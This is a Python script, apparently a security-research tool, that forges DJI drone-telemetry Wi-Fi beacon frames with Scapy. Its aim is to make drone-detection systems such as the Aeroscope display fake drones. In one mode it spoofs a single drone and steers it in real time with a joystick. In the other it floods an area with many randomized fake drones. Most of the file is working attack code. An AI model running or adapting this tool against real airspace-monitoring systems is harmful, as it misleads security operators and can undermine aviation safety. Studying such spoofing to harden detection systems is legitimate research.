from Beacon import *
import struct
import sys, getopt, argparse
from scapy.sendrecv import sendp, send
import random, string
from math import floor
import jstest
import time, os
import threading
from Drone import *





'''
   Assemble the DJI payload to a 802.11 beacon packet
'''
def create_packet(beacon_base, payload):
    packet = beacon_base.copy()  

    # Not necessary but it appears in different DJI models
    vendor_microsoft = Dot11EltVendorSpecific(ID=221, len= 24, oui= 0x0050f2,info = b'\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')

    # DJI Payload
    tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(payload) + 3,oui=0x263712, info = payload)
    packet = packet / vendor_microsoft / tag_vendor_dji 

    return packet


'''
Update the DJI Vendor ID info from the Scapy Beacon object
'''
def update_packet(prev_packet, new_payload):
    
    # New DJI Payload
    new_tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(new_payload) + 3,oui=0x263712, info = new_payload)

    #is the last Vendor Specific tag... in case we added the Microsoft Vendor Tag
    prev_packet[Dot11EltVendorSpecific][len([prev_packet[Dot11EltVendorSpecific]])-1].payload = new_tag_vendor_dji
    return prev_packet



is_event = 0
'''
The sendp() from Scapy uses a loop that stops only when Ctr+C is pressed.
We want to stop sending a previous payload and start sending a new one
This is a simple way to stop sending a packet.
At the same time, it can be send a packet while the controller is waiting for events (cuz it's also blocking)
'''
def thread_send(packet):
    print("Start Thread")
    count = 0
    global is_event
    while is_event == 0:
        count += 1
        try:
            sendp(packet[1], iface=interface, verbose=0, loop=0, count=1)
            time.sleep(0.3)
        except KeyboardInterrupt:
            break
    print("Exiting Thread. Packet sent {} times".format(count))

'''
Single Drone Spoofing
If it does not get any input, the values are set randomly

If it detects a joystic, it will process the events and will update drone's values.
'''
def one_drone():
    print("Press intro to set default")
    ssid = str(input("SSID: "))
    lat = (input("Latitude: "))
    lon = (input("Longitude: "))
    altitude = (input("Altitude (Max 65535): "))
    home_lat = (input("Home Latitude: "))
    home_long = (input("Home Longitude: "))
    uuid = str(input("UUID (16 chars): "))
  

    # Create base beacon packet for carrying info of a drone
    source_address = "60:60:1f:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))    
    if len(ssid) == 0:
        ssid = "MAVIC_AIR_REAL"
    beacon_base_packet = Beacon(source_address, ssid).get_beacon()

    # Set drone's initial attributes
    drone = Drone(ssid=ssid, lat=lat, lon=lon, altitude=altitude, home_lat=home_lat, home_lon=home_long, uuid=uuid)


    # ==== BUILD PACKET LIST =====
    # Flight Info beacons It won't change
    finfo_payload = drone.build_finfo() # ToDo Get user input toset flight info
    finfo_packet = create_packet(beacon_base_packet,finfo_payload)
    # Create the DJI payload in bytes and build the packet with scapy
    telemetry_payload = drone.build_telemetry()
    telemetry_packet = create_packet(beacon_base_packet, telemetry_payload)
    
    packet_list = []
    packet_list.append(finfo_packet)
    packet_list.append(telemetry_packet)

    joystick = jstest.JSTest()
    print("Joystick  {}".format(joystick.gamepad))

    if joystick.gamepad:
        #ts= time.time()
        global is_event
        drone.v_east = 0
        drone.v_north = 0

        while 1:
            updated = True
            try:
                # Start sending packets in a different thread since Joystick is blocking when waiting for events
                send_thread = threading.Thread(target=thread_send, args=(packet_list,))
                send_thread.start()
                
                print("Waiting event")
                events = joystick.gamepad._do_iter() # It blocks untl event is detected
                
                print("New Event. Exiting thread (main)")

                send_thread.join()
                is_event = 0 # Reset
                
                #does not work still blocks...
                if events is None or len(events) == 0:
                    print("About to break. No events... but does not work")
                    break

                for event in events:
                   
                    joystick.process_event(event)
                    
                    axis, value = joystick.axis, joystick.axis_value   # -1X , 1X, -1Y, 1Y, -1RX, -1RY

                    print("Event:  {} {}".format(axis, value))
                    if axis == "X": # Modify Longitude
                        print("Update longitude")
                        drone.longitude = drone.longitude +  float("{:.4f}".format(float(value/ 1000))) # To modify the 4 decimal digit
                        # Substitute payload bytes corresponding to the longitude
                        drone.longitude_bytes = location2bytes(drone.longitude)

                        drone.v_east =  (drone.v_east + 100 * value)  * value # All the time will increase the speed. 
                        drone.v_north =  (drone.v_north - 50) if drone.v_north > 0 else drone.v_north + 50 # To reduce the speed on the other axis

                    elif axis == "Y": # Modify Latitude
                        print("Update latitude")
                        
                        drone.latitude = drone.latitude + float("{:.4f}".format(float(value / 1000))) * (-1)

                        # Substitute payload bytes corresponding to the latitude 
                        drone.latitude_bytes = location2bytes(drone.latitude)

                        drone.v_north =  (drone.v_north +  (-value) * 50)  * value
                        drone.v_east =  (drone.v_east - 50) if drone.v_east > 0 else drone.v_east + 50

                    elif axis == "RY":
                       # Increase Altitude (and Vertical Speed)
                        # Minimum Altitude 0. ToDo limit upper boundary
                        if drone.altitude >= 0 and drone.altitude < 2**16-1:                       
                            drone.altitude = drone.altitude + value * (-1) # Same reason. Axis value sign is inverted
                            if drone.altitude <0:
                                drone.altitude = 0

                    elif axis == "RX":
                        # modify yaw
                        pass
                   # Change speed to show 3 different colors.
                    elif axis == "TL" and value == 1: # Skip when button released event.
                        drone.v_east =  (drone.v_east + 200) % 2500# speed is divided by 100 in the aeroscope.If we want to increase 1 in the aeroscope, we add 100 here
                        drone.v_north = (drone.v_east + 200) % 2500
                        
                    elif axis == "Z": # Increase speed, both in X and Y axis
                        drone.v_east = drone.v_east + 100 if drone.v_east > 0 else drone.v_east - 100
                        drone.v_north = drone.v_north + 100 if drone.v_north > 0 else drone.v_north - 100

                    elif axis == "RZ": # Decrease speed in both horizontal axis
                        drone.v_east = drone.v_east - 100 if drone.v_east > 0 else drone.v_east + 100
                        drone.v_north = drone.v_north - 100  if drone.v_north > 0 else drone.v_north + 100

                    else:
                        # The event does not have any action assigned
                        updated = False
                        continue

                if not updated:
                    # Thread keeps sending the same packet
                    print("Packet not updated")
                    # is_event = 0
                    continue

                #Create new payload and update packet
                new_payload = drone.build_telemetry()
                #print(packet_list[1][Dot11EltVendorSpecific].show(dump=True))

                packet_list[1] = update_packet(packet_list[1], new_payload)
                print("UPDATED")
                #print(packet_list[1][Dot11EltVendorSpecific].show(dump=True))
                #packet_list[1] = update_packet(packet_list[1], new_payload)
                is_event = 0 # new loop iteration we start thread sending new payload

            except KeyboardInterrupt:
                is_event = 1
                break

            print("Latitude: {} --- Longitude: {}".format(drone.latitude, drone.longitude))
            print("Altitude: {} ".format(drone.altitude))
            print("Speed: {}".format(sqrt(drone.v_north **2 + drone.v_east **2)))


    
    else:
        '''
        Spoofing a single drone without any motion
        '''      
        sendp(packet_list, iface=interface, loop=1, inter=0.5)

def random_spoof(n, point=None):
    
    n_drones = n
    # ToDo Check if I need to copy the packet, or otherwise it reuses the same

    source_address = ""
    ssid = ""
    beacon = Beacon(source_address, ssid ) #
    beacon_base_packet = beacon.get_beacon()

    packet_list = [] # set of packets to be sent
    # First all packets are generated and they will be sent afterwards
    for i in range( int(n_drones)):
        beacon_base_copy = beacon_base_packet.copy()
        print("===========================")
        print("Setting Drone {}".format(i))
        print("===========================")
        
        drone = Drone(i, point)
        beacon_base_copy.ssid =  drone.ssid
        beacon_base_copy.addr2 = drone.mac_address
        print("SSID: {}".format(drone.ssid))
        print("MAC Address {}".format(drone.mac_address))
        print("Location [Lon Lat]: {} {}".format(drone.longitude, drone.latitude))   
        # Build DJI Payload
        payload = drone.build_telemetry()
        telemetry_packet = create_packet(beacon_base_copy, payload)
        packet_list.append(telemetry_packet)
    
    print("=========All drones are ready ==================")
    sendp(packet_list, iface=interface, loop=1, inter=2)


'''
=====================================================================
Main
Arguments indicate whether to spoof a single specific drone or N random drones (around a given point)
=====================================================================
'''

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", help="Spoof on drone. poofing parameters are set by the user.")
parser.add_argument("-r", "--random", help="Spoof randomly N drones")
parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: -a '46.76 7.62 '")

args = parser.parse_args()
print("Arguments: {}".format(args))

if not args.interface:
    raise SystemExit(
"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'> \n \
-r N            Spoof N random drones around the map. \n \
-a 'lat long'     If set, drones are spoofed around point \n \
Interface must be in monitor mode")

else:

    interface = args.interface
    
    if args.random : # Consider fail when you pass 0 drones... ToDo
        n_random = args.random
        
        print("Spoofing {} drones".format(n_random))
        if args.area:
            point = args.area.split()
            print(point)
            random_spoof(n_random, point)
        random_spoof(n_random)

    else: #Spoof only one drone
        one_drone()